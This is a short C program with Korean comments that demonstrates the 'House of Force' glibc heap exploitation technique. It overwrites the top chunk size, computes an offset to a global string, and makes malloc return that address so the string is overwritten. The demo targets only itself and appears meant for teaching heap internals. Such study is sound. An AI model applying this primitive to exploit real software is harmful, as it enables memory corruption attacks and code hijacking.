// gcc -o force1 force1.c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

char target[] ="im target!\n";

int main(){
        char *buf1;
        char *trash;
        char *exploit;

        __uint64_t* top_chunk_size_addr;
        __uint64_t exploit_size = 0;
        __uint32_t target_addr = &target;

        buf1 = malloc(0x100);
        // 힙 청크를 할당한 후 top chunk size 의 주소 값을 알아낸다.
        top_chunk_size_addr = buf1 + 0x108;

        fprintf(stderr,"target : %s\n", target);
        fprintf(stderr,"buf1 : 0x%x\n", buf1);
        fprintf(stderr,"top_chunk_size : 0x%x\n", top_chunk_size_addr);
        fprintf(stderr,"target_addr : 0x%x\n", 0x601048);

        // top chunk size의 주소 값을 2^64-1로 조작한다.
        *top_chunk_size_addr = 0xffffffffffffffff;
        
        // target 주소 - 0x10(메타데이터 크기) - top chunk 주소 - 0x8
        exploit_size = target_addr - 0x10 - (__int64_t)top_chunk_size_addr - 0x8;

        fprintf(stderr,"exploit_size : 0x%lx\n", exploit_size);

        // malloc 함수를 통해 할당시 원하는 임의의 영역에 힙을 할당할 수있다.
        trash = malloc(exploit_size);
        exploit = malloc(0x100);

        fprintf(stderr,"malloc_addr : 0x%x\n", exploit);
        // malloc에서 리턴된 target 주소에 문자열 복사
        
        strcpy(exploit, "exploited!!!!!!");
        fprintf(stderr,"target : %s\n", target);
        return 0;
}